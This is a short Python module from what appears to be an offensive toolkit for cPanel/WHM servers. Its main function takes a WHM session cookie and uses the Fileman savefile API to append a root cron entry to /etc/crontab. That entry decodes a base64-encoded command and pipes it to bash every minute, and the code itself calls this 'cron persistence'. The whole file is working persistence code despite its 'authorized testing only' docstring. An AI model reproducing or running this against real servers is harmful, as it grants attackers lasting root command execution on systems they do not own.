# Made by Sn0w8ird

from __future__ import annotations

import base64
import urllib.parse

from cpointed.core.session import CPointedClient


async def add_cron_job_whm(
    client: CPointedClient,
    session: str,
    command: str,
    schedule: str = "* * * * *",
    *,
    timeout: float = 30.0,
) -> bool:
    """Add a root cron line via WHM json-api Fileman append to ``/etc/crontab`` (authorized testing only)."""
    b64_cmd = base64.b64encode(command.encode()).decode()
    cron_line = f"{schedule} root echo {b64_cmd} | base64 -d | bash\n"
    encoded_line = urllib.parse.quote(cron_line, safe="")
    path = (
        "/json-api/cpanel?cpanel_jsonapi_user=root&cpanel_jsonapi_apiversion=2"
        "&cpanel_jsonapi_module=Fileman&cpanel_jsonapi_func=savefile"
        f"&path=/etc/crontab&content={encoded_line}&append=1"
    )
    headers = {"Cookie": f"whostmgrsession={session}"}
    resp = await client.request("GET", path, headers=headers, timeout=timeout)
    return resp.status_code == 200


def install_cron_placeholder(**kwargs):
    """Deprecated: use ``add_cron_job_whm`` with a live WHM session."""
    raise NotImplementedError("Cron persistence is engagement-specific; use add_cron_job_whm.")
